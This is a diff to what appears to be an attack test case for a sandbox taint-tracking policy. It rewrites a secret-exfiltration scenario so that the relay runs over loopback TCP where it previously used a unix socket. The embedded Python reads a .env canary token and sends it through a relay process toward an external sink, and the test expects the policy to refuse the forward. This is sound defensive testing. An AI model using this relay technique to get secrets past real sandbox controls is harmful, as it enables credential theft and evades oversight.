@@ -1,9 +1,9 @@
-# KNOWN GAP: `recommended` does not forbid the `unix` peer class. Shell 1 (a
-# different, untainted principal) runs a relay on a unix-domain socket that
-# forwards to the external sink. Shell 0 reads the secret and writes it to the
-# unix socket -- an allowed peer -- and the relay carries it out. Registered in
-# known-gaps.toml.
-name = "proxy-via-unix"
+# Shell 1 (a different principal) runs a relay that listens on 127.0.0.1 and
+# forwards to the external sink. Shell 0 reads the secret and sends it to the
+# relay -- a loopback peer `recommended` permits. Shell 0's contact hands its
+# taint to every principal holding a socket bound to 127.0.0.1:18080, so the
+# relay's forward to the external sink must be refused.
+name = "proxy-via-loopback"
 kind = "attack"
 policy = "recommended"
 # No shared `principal`: the relay is a separate principal from the reader.
@@ -15,14 +15,10 @@ contents = "TOKEN={CANARY}\n"
 [[files]]
 path = "relay.py"
 contents = """
-import os, socket
-path = "/tmp/marsh-leak-relay.sock"
-try:
-    os.unlink(path)
-except FileNotFoundError:
-    pass
-srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-srv.bind(path)
+import socket
+srv = socket.socket()
+srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+srv.bind(("127.0.0.1", 18080))
 srv.listen(1)
 conn, _ = srv.accept()
 data = conn.recv(65536)
@@ -37,8 +33,8 @@ contents = """
 import socket, time
 secret = open(".env", "rb").read()
 time.sleep(0.5)
-s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-s.connect("/tmp/marsh-leak-relay.sock")
+s = socket.socket()
+s.connect(("127.0.0.1", 18080))
 s.sendall(secret)
 """
 
